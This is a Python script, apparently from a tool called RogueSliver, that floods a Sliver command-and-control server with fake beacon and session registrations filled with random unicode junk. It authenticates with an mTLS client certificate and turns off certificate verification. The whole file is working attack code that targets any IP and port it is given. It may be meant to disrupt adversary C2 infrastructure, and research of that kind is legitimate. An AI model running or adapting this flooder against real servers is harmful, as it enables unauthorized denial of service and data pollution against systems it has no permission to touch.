#!/usr/bin/python
import socket, ssl
from RogueSliver.consts import msgs
import random
import struct
import RogueSliver.sliver_pb2 as sliver
import json
import argparse
import uuid
from google.protobuf import json_format
from rich import print

ssl_ctx = ssl.create_default_context()
ssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')
ssl_ctx.load_verify_locations('certs/ca.crt')
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

def rand_unicode(junk_sz):
  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()
  return(junk)

def junk_register(junk_sz):
  register = {
    "Name": rand_unicode(junk_sz),
    "Hostname": rand_unicode(junk_sz),
    "Uuid": str(uuid.uuid4()),
    "Username": rand_unicode(junk_sz),
    "Uid": rand_unicode(junk_sz),
    "Gid": rand_unicode(junk_sz),
    "Os": rand_unicode(junk_sz),
    "Arch": rand_unicode(junk_sz),
    "Pid": random.randint(0,10*junk_sz),
    "Filename": rand_unicode(junk_sz),
    "ActiveC2": rand_unicode(junk_sz),
    "Version": rand_unicode(junk_sz),
    "ReconnectInterval": random.randint(0,10*junk_sz),
    "ConfigID": str(uuid.uuid4()),
    "PeerID": random.randint(0,10*junk_sz),
    "Locale": rand_unicode(junk_sz)
  }
  return register

def send_envelope(envelope,ip,port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ssl_ctx.wrap_socket(s,) as ssock:
      ssock.connect((ip,port))
      data_len = struct.pack('I',len(envelope.SerializeToString()))
      ssock.write(data_len)
      ssock.write(envelope.SerializeToString())

def register_session(ip,port):
  print('[yellow]\[i][/yellow] Sending session registration.')
  reg = sliver.Register()
  json_format.Parse(json.dumps(junk_register(50)),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Register')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

def register_beacon(ip,port):
  print('[yellow]\[i][/yellow] Sending beacon registration.')
  reg = sliver.BeaconRegister()
  reg.ID = str(uuid.uuid4())
  junk_sz = 50
  reg.Interval = random.randint(0,10*junk_sz)
  reg.Jitter = random.randint(0,10*junk_sz)
  reg.NextCheckin = random.randint(0,10*junk_sz)
  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('BeaconRegister')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

description = '''
Flood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.
'''

def cmdline_args():
  p = argparse.ArgumentParser(prog='BeaconFlood', description=description,
      formatter_class=argparse.RawDescriptionHelpFormatter)
  
  p.add_argument("ip", type=str,
                 help="The target C2 server IP.")
  p.add_argument("port", type=int,
                 help="The target C2 server port.")
  return(p.parse_args())


if __name__ == '__main__':
  args = cmdline_args()

  c = 0
  while True:
    register_beacon(args.ip,args.port)
    c+=1
    if c == 50:
      break
  